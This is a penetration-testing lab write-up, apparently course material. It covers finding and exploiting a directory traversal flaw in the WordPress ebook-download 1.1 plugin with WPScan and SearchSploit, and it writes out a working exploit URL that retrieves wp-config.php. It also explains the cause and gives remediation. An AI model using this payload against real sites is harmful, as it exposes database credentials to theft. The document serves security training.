````markdown
# Exercise 4: Exploiting Directory Traversal Vulnerability in a WordPress Application

## Objective

The objective of this lab is to identify a vulnerable WordPress plugin and exploit a **Directory Traversal** vulnerability to access sensitive files stored outside the web server's intended directory.

---

# Real-World Scenario

Imagine a company hires you as a penetration tester to assess their WordPress website.

They only provide you with the website URL.

Example:

```
http://www.cpent.com
```

They **do not tell you**:

- Which plugins are installed
- Which plugin is vulnerable
- What version they are using

Your job is to investigate and identify these details yourself.

---

# Why Are We Doing This Lab?

As a penetration tester, our goal is to answer these questions:

- Which plugins are installed?
- Are any of those plugins vulnerable?
- Is a public exploit available?
- Can the vulnerability expose sensitive files?

This lab teaches the complete workflow of exploiting a known WordPress plugin vulnerability.

---

# Lab Workflow

```
Target Website
       │
       ▼
Enumerate Plugins (WPScan)
       │
       ▼
Identify Installed Plugin
       │
       ▼
Search for Public Exploit
       │
       ▼
Read the Exploit (PoC)
       │
       ▼
Understand the Vulnerability
       │
       ▼
Exploit the Vulnerability
       │
       ▼
Download Sensitive File
       │
       ▼
Report the Finding
```

---

# Step 1: Enumerate WordPress Plugins

Command:

```bash
wpscan --url http://www.cpent.com --enumerate p
```

## Why?

Before exploiting anything, we must know what the website is running.

WPScan scans the WordPress installation and lists installed plugins.

Example:

```
WooCommerce

Contact Form

ebook-download
```

Now we know the website uses the **ebook-download** plugin.

### Why is this important?

Most WordPress compromises happen because of vulnerable plugins or themes rather than WordPress itself.

So, identifying installed plugins is the first step.

---

# Step 2: Search for Public Vulnerabilities

Command:

```bash
searchsploit ebook download 1.1
```

## Why?

Now that we know the plugin name, we need to check whether a known vulnerability already exists.

SearchSploit searches the local Exploit Database (Exploit-DB) for public exploits.

Example output:

```
Exploit ID: 39575
```

This tells us that the plugin has a publicly known vulnerability.

---

# Step 3: Copy the Exploit

Command:

```bash
searchsploit -m 39575
```

## Why?

The `-m` (mirror) option copies the exploit file from the Exploit Database to the current directory.

Now we have a local copy of the exploit for analysis.

---

# Step 4: Read the Proof of Concept (PoC)

Command:

```bash
cat 39575.txt
```

## Why?

Never execute an exploit without understanding it.

Reading the PoC helps us understand:

- Which software is affected
- What type of vulnerability exists
- How the exploit works
- Which URL or parameter is vulnerable

In this case, the PoC shows that the vulnerable file is:

```
filedownload.php
```

---

# Understanding Directory Traversal

Suppose the website has the following folder structure:

```
Website Root
│
├── wp-config.php
│
└── wp-content
      │
      └── plugins
            │
            └── ebook-download
                  │
                  └── filedownload.php
```

The vulnerable script (`filedownload.php`) should normally download files only from its own directory.

However, it accepts user-controlled file paths.

---

## What does `../` mean?

```
..
```

means:

> Move one directory up.

Example:

```
ebook-download
        │
        ▼
plugins
```

Another `..`

```
plugins
      │
      ▼
wp-content
```

Another `..`

```
wp-content
      │
      ▼
Website Root
```

Now the attacker reaches:

```
wp-config.php
```

Therefore,

```
../../../wp-config.php
```

means:

- Go back three directories.
- Access the `wp-config.php` file.

This is called **Directory Traversal**.

---

# Step 5: Exploit the Vulnerability

URL used:

```text
http://www.cpent.com/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php
```

### What happens?

Normally, the application expects something like:

```
ebookdownloadurl=book.pdf
```

Instead, we provide:

```
../../../wp-config.php
```

If the application does not validate the path, it downloads the configuration file instead.

---

# Why is `wp-config.php` Important?

This file contains sensitive information such as:

- Database Name
- Database Username
- Database Password
- Database Host
- Authentication Keys

If an attacker downloads this file, they gain valuable information that could lead to further compromise.

---

# Step 6: Verify the Download

After visiting the vulnerable URL, the browser downloads:

```
wp-config.php
```

This confirms that the Directory Traversal vulnerability has been successfully exploited.

---

# Why Did the Vulnerability Occur?

The developer expected users to request only legitimate files, for example:

```
ebookdownloadurl=book.pdf
```

However, the application never checked whether the supplied path contained:

```
../
```

Because of this missing validation, attackers can escape the intended directory and access sensitive files.

---

# What Would a Penetration Tester Report?

Instead of simply saying:

```
The website is vulnerable.
```

A professional report would include:

**Vulnerability**

```
Directory Traversal
```

**Affected Plugin**

```
ebook-download 1.1
```

**Impact**

```
An attacker can download sensitive files such as wp-config.php, exposing database credentials and other confidential information.
```

**Evidence**

```
Successfully downloaded wp-config.php.
```

**Recommendation**

- Update or remove the vulnerable plugin.
- Validate file paths properly.
- Block the use of `../` sequences.
- Restrict file downloads to approved directories.

---

# Key Takeaways

- Use **WPScan** to identify installed WordPress plugins.
- Use **SearchSploit** to search for publicly available exploits.
- Always read the Proof of Concept before attempting exploitation.
- Directory Traversal allows attackers to access files outside the intended directory.
- Sensitive files such as `wp-config.php` should never be accessible through user-controlled input.
- A penetration tester's job is to identify the vulnerability, demonstrate its impact in an authorized environment, and provide remediation recommendations.
````
